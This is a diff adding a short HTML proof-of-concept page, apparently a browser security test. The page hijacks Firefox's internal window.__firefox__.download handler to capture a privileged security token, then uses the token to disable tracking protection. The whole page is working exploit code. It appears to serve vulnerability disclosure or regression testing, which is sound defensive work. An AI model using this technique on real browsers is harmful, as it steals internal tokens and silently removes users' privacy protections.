@@ -1,0 +1,35 @@
+<html>
+<body>
+<h1>Security Token Leakage with Download Handler</h1>
+<a href="https://mozilla.org/">Download Juicy Content Here</a><br><br>
+<div id="result"></div>
+<script>
+if (typeof window.__firefox__.download == "undefined") {
+  Object.defineProperty(window.__firefox__, "download", {
+    enumerable: true,
+    configurable: true,
+    writable: false,
+    value: function(url, securityToken) {
+      window.securityToken = securityToken
+      document.getElementById('result').innerHTML += `<h3 style="color:red;">Got security token:<u>${securityToken}</u></h3>`;
+    }
+  });
+  document.body.innerHTML += '<b style="color:purple;">Injected malicious download handler</b><br>';
+} else {
+  document.body.innerHTML += '<b style="color:green;">Safe</b><br>';
+}
+</script>
+
+
+<button onclick="window.__firefox__.TrackingProtectionStats.setEnabled(false, window.securityToken);">
+  Disable Tracking Protection by abusing securityToken
+</button>
+<br>
+<br>
+<button onclick="alert(window.fetch)">
+  Show `window.fetch` object
+</button>
+<br>
+<small>The word "[native code]" is shown if Tracking Protection is disabled.</small>
+</body>
+</html>
